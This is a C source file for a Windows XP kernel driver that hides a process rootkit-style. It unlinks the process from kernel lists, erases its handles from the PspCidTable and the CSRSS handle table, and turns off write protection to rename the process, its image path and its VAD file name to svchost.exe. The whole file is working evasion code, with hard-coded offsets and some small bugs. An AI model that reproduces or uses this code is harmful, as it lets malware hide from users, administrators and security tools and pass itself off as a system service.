#include "HideProcess.h"
#include "WindowsVersion.h"
#include "CommonFunc.h"
// 指明遍历哪个句柄表,0表示全局句柄表
ULONG	EnumCallBackHideType = 0;
static WCHAR s_wszSvchostPath[]=L"\\Windows\\System32\\svchost.exe";
static UNICODE_STRING s_uSvchostPath = {0};
static WCHAR s_wszOwnProcessPath[260] = {0};
static CHAR s_szsvchostName[]="svchost.exe";
static UNICODE_STRING s_uOwnProcessPath = {0};
// 用于保存CSRSS待擦除对象
PVOID	EnumCallBackHideObject;
PHANDLE_TABLE g_PspCidTableAddress;

PHANDLE_TABLE_ENTRY PspHideCidTableEntry = NULL;
PVOID HidePspObject = NULL;
//
PEPROCESS g_pProtectProcess = NULL;
ULONG g_nProtectId = 0;
//
typedef VOID (__stdcall *PKESTACKATTACHPROCESS)	(__inout PRKPROCESS Process,
	__out PKAPC_STATE ApcState
	);
PKESTACKATTACHPROCESS g_pKeStackAttachProcess = NULL;

typedef VOID (__stdcall *PKEUNSTACKDETACHPROCESS)(
	__in PKAPC_STATE ApcState
	);
PKEUNSTACKDETACHPROCESS g_pKeUnstackAttachProcess = NULL;
//驱动加载时记录自身进程和svchost.exe进程
BOOL InitReplaceFunctions()
{
	g_pKeStackAttachProcess = (PKESTACKATTACHPROCESS)GetExortedFunctionAddress(L"KeStackAttachProcess");
	g_pKeUnstackAttachProcess = (PKEUNSTACKDETACHPROCESS)GetExortedFunctionAddress(L"KeUnstackDetachProcess");
	if (g_pKeStackAttachProcess == NULL ||
		g_pKeUnstackAttachProcess == NULL)
	{
		return FALSE;
	}
	//
	RtlInitUnicodeString(&s_uSvchostPath,s_wszSvchostPath);
	return TRUE;
}

//脱两条链表
NTSTATUS RemoveFromProcessLinks( PEPROCESS Eprocess )
{
	PLIST_ENTRY pList_Current;

	if( Eprocess == NULL )
	{
		return STATUS_UNSUCCESSFUL;
	}

	//
	// 开始脱链
	//
	pList_Current = ( PLIST_ENTRY )( ( ULONG ) Eprocess + 0x88 );

	if( pList_Current->Flink )
	{
		pList_Current->Blink->Flink = pList_Current->Flink;
	}

	if( pList_Current->Blink )
	{
		pList_Current->Flink->Blink = pList_Current->Blink;
	}

	pList_Current->Flink = NULL;
	pList_Current->Blink = NULL;

	//
	// SessionProcessLinks
	//
	pList_Current = ( PLIST_ENTRY )( ( ULONG ) Eprocess + 0x0b4 );

	if( pList_Current->Blink && pList_Current->Blink->Flink )
	{
		pList_Current->Blink->Flink = pList_Current->Flink;
	}

	if( pList_Current->Flink && pList_Current->Flink->Blink )
	{
		pList_Current->Flink->Blink = pList_Current->Blink;
	}

	pList_Current->Flink = NULL;
	pList_Current->Blink = NULL;

	return  STATUS_SUCCESS;
}

//
// 断开HandleTableList
//
VOID RemoveFromHandleTableList( PEPROCESS Eprocess)
{
	PLIST_ENTRY pList_Current;

	// WIN XP SP3硬编码
	pList_Current = ( PLIST_ENTRY )( * ( ULONG* )( ( ULONG ) Eprocess + 0xc4 ) + 0x1c );
	if( pList_Current != NULL )
	{
		if (pList_Current->Blink && pList_Current->Blink->Flink )
		{
			pList_Current->Blink->Flink = pList_Current->Flink;
		}

		if (pList_Current->Flink && pList_Current->Flink->Blink )
		{
			pList_Current->Flink->Blink = pList_Current->Blink;
		}

		pList_Current->Flink = NULL;
		pList_Current->Blink = NULL;
	}
	return;
}

/*
// 遍历句柄表回调函数
// HandleTableEntry	: A pointer to the top level handle table tree node.
// Handle			: 本次遍历到的HANDLE 索引值
// EnumParameter	: 每次遍历到一个可用HANDLE,就会传递程序员指定的32BIT值的地址
*/
BOOL EnumTableCallBack(
	IN PHANDLE_TABLE_ENTRY HandleTableEntry,
	IN HANDLE Handle,
	IN OUT PVOID EnumParameter )
{

	PVOID Temp = NULL;

	if( EnumCallBackHideType == 0 )
	{
		//
		// 遍历到要隐藏的句柄
		//
		if( ARGUMENT_PRESENT( EnumParameter ) && * ( ( HANDLE* ) EnumParameter ) == Handle )
		{
			CodeVprint( "找到待擦除句柄!\r\n") ;

			* ( PHANDLE_TABLE_ENTRY* ) EnumParameter = HandleTableEntry;

			return TRUE;
		}
		else
		{
			return FALSE;
		}
	}
	else if( EnumCallBackHideType == 1 )
	{
		//
		// 遍历的是csrss进程句柄表
		//
		Temp = HandleTableEntry->Object;

		//
		// 遍历到要隐藏的句柄
		//
		if( ARGUMENT_PRESENT( EnumParameter ) && Temp == EnumCallBackHideObject )
		{
			CodeVprint( "Get Csrss EraseHandle!\r\n");

			* ( PHANDLE_TABLE_ENTRY* ) EnumParameter = HandleTableEntry;
			return TRUE;
		}
		else
		{
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}
}
//
//
// 擦除某个Eprocess句柄表中指定的进程ID句柄
//

NTSTATUS EraseObjectFromTable( IN PHANDLE_TABLE HandleTable, IN HANDLE ProcessId )
{
	NTSTATUS Status;
	PVOID EnumParameter = NULL;
	UNICODE_STRING uExEnumHandleTable = {0};
	PExEnumHandleTable ExEnumHandleTable;

	Status = STATUS_NOT_FOUND;

	EnumParameter = ProcessId;

	RtlInitUnicodeString( &uExEnumHandleTable, L"ExEnumHandleTable" );
	ExEnumHandleTable = MmGetSystemRoutineAddress( &uExEnumHandleTable );

	if( NULL == ExEnumHandleTable )
	{
		CodeVprint( "Get ExEnumHandleTable Address Error!\n" );
		return Status;
	}

	//
	// 如果找到
	//
	if( ExEnumHandleTable( HandleTable, EnumTableCallBack, &EnumParameter, NULL ) )
	{
		//
		// 擦除句柄
		//
		//擦除之前先记录一下，只记录PSP表中的
		if (EnumCallBackHideType == 0)
		{
			PspHideCidTableEntry = (PHANDLE_TABLE_ENTRY)EnumParameter;
			HidePspObject = PspHideCidTableEntry->Object;
		}
		InterlockedExchangePointer( & ( ( PHANDLE_TABLE_ENTRY ) EnumParameter )->Object, NULL );

		CodeVprint( "Call EraseObjectFromTable Success\n" );

		Status = STATUS_SUCCESS;
	}

	return Status;
}
//获取进程句柄表
PHANDLE_TABLE GetEprocessObjectTable(PEPROCESS process)
{
	return (PHANDLE_TABLE)(*(PULONG)((ULONG)process+0xc4));
}
//
// 抹除csrss的句柄表里的指定进程句柄
//
NTSTATUS EraseCsrsstable( PEPROCESS HideEprocess, HANDLE dwHidePid )
{
	NTSTATUS Status;
	PEPROCESS CsrssEprocess = NULL;

	Status = LookupProcessByName( "CSRSS.EXE", &CsrssEprocess );
	if( !NT_SUCCESS( Status ) )
	{
		return Status;
	}

	EnumCallBackHideType   = 1;
	EnumCallBackHideObject = HideEprocess;

	//
	// 句柄表偏移
	//
	return EraseObjectFromTable( GetEprocessObjectTable( CsrssEprocess ), dwHidePid );
}

NTSTATUS ErasePspTable(HANDLE dwHidePid)
{
	CodeVprint( "开始擦除PspCidTable句柄表进程句柄\n" );

	if(STATUS_SUCCESS != GetPspCidTable(&g_PspCidTableAddress))
	{
		return STATUS_UNSUCCESSFUL;
	}
	EnumCallBackHideType = 0;
	// EraseObjectFromTable( * ( PULONG ) pPspHandleAddr, dwHidePid );
	return EraseObjectFromTable(g_PspCidTableAddress,dwHidePid);
}
//
BOOL ReplaceUnicodeString(PUNICODE_STRING pDestStr,PUNICODE_STRING pSrcString)
{
    if(pDestStr == NULL)return FALSE;

	//当目的buffer大小 < 要覆盖的buffer 长度的话，会有危险
	//if (pDestStr->MaximumLength < pSrcString->Length)
	//{
	//	CodeVprint("pDestStr->MaximumLength < uniSvchostString.Length\n");
	//	return FALSE;
	//}
	WPOFF();
	RtlCopyUnicodeString(pDestStr,pSrcString);
	WPON();
	return TRUE;
}
//
BOOL RelaceString(PCHAR pDesStr,PCHAR pSrcString)
{
	if (pDesStr == NULL)return;
	//目的buffer是16个大小吧
	WPOFF();
	strcpy(pDesStr,pSrcString);
	WPON();
	return TRUE;
}
//保护我们的进程
VOID HideProcessByName(PCHAR ProcessName)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	KAPC_STATE ApcState;
	ULONG pPebAddress = 0;
	ULONG ProcessParameters=0,ldr =0,tmp = 0;
	PUNICODE_STRING pPath = NULL;
	//+0x1b0 Peb              : Ptr32 _PEB
	status =  LookupProcessByName(ProcessName,&g_pProtectProcess);
	if (status != STATUS_SUCCESS)
	{
		CodeVprint("HideProcess:LookupProcessByName failed\r\n");
		return;
	}
	g_nProtectId = *(PULONG)((ULONG)g_pProtectProcess+0x084);
	//+0x1b0 Peb              : Ptr32 _PEB
	//pPebAddress = *(PULONG)((ULONG)ProtectProcess+0x1b0);
	//pKeStackAttachProcess(ProtectProcess,&ApcState);
	//__try
	//{
	//	ProcessParameters = *(PULONG)(pPebAddress + 0x010);
	//	ReplaceUnicodeString((PUNICODE_STRING)(ProcessParameters+0x038));
	//	ReplaceUnicodeString((PUNICODE_STRING)(ProcessParameters+0x040));
	//	ReplaceUnicodeString((PUNICODE_STRING)(ProcessParameters+0x070));
	//	//
	//	ldr = *(PULONG)(pPebAddress + 0x00c);
	//	//暂时不考虑这里
	//}
	//__except(1){}

	//pKeUnstackAttachProcess(&ApcState);
	//
	RelaceString((PCHAR)((ULONG)g_pProtectProcess+0x174),s_szsvchostName);
	pPath = (PUNICODE_STRING)(*(PULONG)((ULONG)g_pProtectProcess + 0x1F4));
	//先保存原来的path
	RtlCopyMemory((BYTE*)s_wszOwnProcessPath,(BYTE*)pPath->Buffer,pPath->MaximumLength);
	//wcscpy_s(s_wszOwnProcessPath,pPath->MaximumLength,pPath->Buffer);
	RtlInitUnicodeString(&s_uOwnProcessPath,s_wszOwnProcessPath);
	ReplaceUnicodeString(pPath,&s_uSvchostPath);
	//
	tmp=*(PULONG)((ULONG)g_pProtectProcess+0x138);
	if (MmIsAddressValidEx((PVOID)tmp))
	{
		tmp=*(PULONG)(tmp+0x14);
		if (MmIsAddressValidEx((PVOID)tmp))
		{
			tmp=*(PULONG)tmp;
			if (MmIsAddressValidEx((PVOID)tmp))
			{
				tmp=*(PULONG)(tmp+0x024);
				if (MmIsAddressValidEx((PUNICODE_STRING)(tmp+0x030)))
				{
					ReplaceUnicodeString((PUNICODE_STRING)(tmp+0x030),&s_uSvchostPath);
				}
			}
		}
	}
	//VAD
	//should use MmIsAddressValid to verify
	tmp=*(PULONG)((ULONG)g_pProtectProcess+0x11c);
	if (MmIsAddressValidEx((PVOID)tmp))
	{
			tmp=*(PULONG)(tmp+0x10);
			if (MmIsAddressValidEx((PVOID)tmp))
			{
				tmp=*(PULONG)(tmp+0x018);
				if (MmIsAddressValidEx((PVOID)tmp))
				{
					tmp=*(PULONG)(tmp+0x024);
					if (MmIsAddressValidEx((PVOID)(tmp+0x030)))
					{
						ReplaceUnicodeString((PUNICODE_STRING)(tmp+0x030),&s_uSvchostPath);
					}
				}
			}
	}

}
//
VOID HideProcess(PEPROCESS eprocess)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	KAPC_STATE ApcState;
	ULONG pPebAddress = 0;
	ULONG ProcessParameters=0,ldr =0,tmp = 0;
	PUNICODE_STRING pPath = NULL;
	//+0x1b0 Peb              : Ptr32 _PEB
	//status =  LookupProcessByName(ProcessName,&g_pProtectProcess);
	//if (status != STATUS_SUCCESS)
	//{
	//	CodeVprint("HideProcess:LookupProcessByName failed\r\n");
	//	return;
	//}
	if (eprocess == NULL)
	{
		return;
	}
	g_pProtectProcess = eprocess;
	g_nProtectId = *(PULONG)((ULONG)g_pProtectProcess+0x084);
	//+0x1b0 Peb              : Ptr32 _PEB
	//pPebAddress = *(PULONG)((ULONG)ProtectProcess+0x1b0);
	//pKeStackAttachProcess(ProtectProcess,&ApcState);
	//__try
	//{
	//	ProcessParameters = *(PULONG)(pPebAddress + 0x010);
	//	ReplaceUnicodeString((PUNICODE_STRING)(ProcessParameters+0x038));
	//	ReplaceUnicodeString((PUNICODE_STRING)(ProcessParameters+0x040));
	//	ReplaceUnicodeString((PUNICODE_STRING)(ProcessParameters+0x070));
	//	//
	//	ldr = *(PULONG)(pPebAddress + 0x00c);
	//	//暂时不考虑这里
	//}
	//__except(1){}

	//pKeUnstackAttachProcess(&ApcState);
	//
	RelaceString((PCHAR)((ULONG)g_pProtectProcess+0x174),s_szsvchostName);
	pPath = (PUNICODE_STRING)(*(PULONG)((ULONG)g_pProtectProcess + 0x1F4));
	//先保存原来的path
	RtlCopyMemory((BYTE*)s_wszOwnProcessPath,(BYTE*)pPath->Buffer,pPath->MaximumLength);
	//wcscpy_s(s_wszOwnProcessPath,pPath->MaximumLength,pPath->Buffer);
	RtlInitUnicodeString(&s_uOwnProcessPath,s_wszOwnProcessPath);
	ReplaceUnicodeString(pPath,&s_uSvchostPath);
	//
	tmp=*(PULONG)((ULONG)g_pProtectProcess+0x138);
	if (MmIsAddressValidEx((PVOID)tmp))
	{
		tmp=*(PULONG)(tmp+0x14);
		if (MmIsAddressValidEx((PVOID)tmp))
		{
			tmp=*(PULONG)tmp;
			if (MmIsAddressValidEx((PVOID)tmp))
			{
				tmp=*(PULONG)(tmp+0x024);
				if (MmIsAddressValidEx((PUNICODE_STRING)(tmp+0x030)))
				{
					ReplaceUnicodeString((PUNICODE_STRING)(tmp+0x030),&s_uSvchostPath);
				}
			}
		}
	}
	//VAD
	//should use MmIsAddressValid to verify
	tmp=*(PULONG)((ULONG)g_pProtectProcess+0x11c);
	if (MmIsAddressValidEx((PVOID)tmp))
	{
		tmp=*(PULONG)(tmp+0x10);
		if (MmIsAddressValidEx((PVOID)tmp))
		{
			tmp=*(PULONG)(tmp+0x018);
			if (MmIsAddressValidEx((PVOID)tmp))
			{
				tmp=*(PULONG)(tmp+0x024);
				if (MmIsAddressValidEx((PVOID)(tmp+0x030)))
				{
					ReplaceUnicodeString((PUNICODE_STRING)(tmp+0x030),&s_uSvchostPath);
				}
			}
		}
	}

}
//
VOID ResumeProcess()
{
	PUNICODE_STRING pPath = NULL;
	ULONG tmp = 0;
	if (g_pProtectProcess != NULL)
	{
		RelaceString((PCHAR)((ULONG)g_pProtectProcess+0x174),OwnName);
		pPath = (PUNICODE_STRING)(*(PULONG)((ULONG)g_pProtectProcess + 0x1F4));

		ReplaceUnicodeString(pPath,&s_uOwnProcessPath);

		tmp=*(PULONG)((ULONG)g_pProtectProcess+0x138);
		if (MmIsAddressValidEx((PVOID)tmp))
		{
			tmp=*(PULONG)(tmp+0x14);
			if (MmIsAddressValidEx((PVOID)tmp))
			{
				tmp=*(PULONG)tmp;
				if (MmIsAddressValidEx((PVOID)tmp))
				{
					tmp=*(PULONG)(tmp+0x024);
					if (MmIsAddressValidEx((PUNICODE_STRING)(tmp+0x030)))
					{
						ReplaceUnicodeString((PUNICODE_STRING)(tmp+0x030),&s_uOwnProcessPath);
					}
				}
			}
		}
		//VAD
		//should use MmIsAddressValid to verify
		tmp=*(PULONG)((ULONG)g_pProtectProcess+0x11c);
		if (MmIsAddressValidEx((PVOID)tmp))
		{
			tmp=*(PULONG)(tmp+0x10);
			if (MmIsAddressValidEx((PVOID)tmp))
			{
				tmp=*(PULONG)(tmp+0x018);
				if (MmIsAddressValidEx((PVOID)tmp))
				{
					tmp=*(PULONG)(tmp+0x024);
					if (MmIsAddressValidEx((PVOID)(tmp+0x030)))
					{
						ReplaceUnicodeString((PUNICODE_STRING)(tmp+0x030),&s_uOwnProcessPath);
					}
				}
			}
		}
	}
}

//恢复PSPtable
VOID RecoverPspTable()
{
	//if (PspHideCidTableEntry != NULL)
	//{
	//	InterlockedExchangePointer( &((PspHideCidTableEntry)->Object), HidePspObject );
	//}
}